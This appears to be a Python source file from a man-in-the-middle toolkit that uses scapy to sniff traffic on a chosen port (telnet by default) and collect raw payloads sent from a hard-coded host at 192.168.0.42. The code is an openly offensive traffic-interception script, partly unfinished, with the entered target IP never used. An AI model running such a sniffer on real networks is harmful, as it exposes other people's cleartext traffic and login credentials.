from scapy.all import *

from src.mitm.utils import get_mac

buffer = []
target = ""


def decode_packet(pkt):
    global buffer
    global target
    try:
        print("target", target)
        mac = get_mac("192.168.0.42")
        if (pkt[Ether].src == mac and (pkt.getlayer(Raw) is not None)):
            buffer.append(pkt.getlayer(Raw).load)
            print(buffer)
        # if (pkt[IP].src == "192.168.0.42" and pkt[IP].dst == "192.168.0.43"):
        # pkt.show()
        # print(pkt.getlayer(Raw).load)
    except Exception as e:
        print(e)
    # pkt.show()


def sniffer():
    global target
    interface = input("Enter Desired Interface [eth0]: ")
    if interface == "":
        interface = "eth0"

    target = input("[*] Enter target IP: ")
    port = input("[*] Enter port [23]: ")
    if port == "":
        port = 23
    packet_filter = ' port {} '.format(port)
    pkt = sniff(filter=packet_filter, prn=decode_packet)
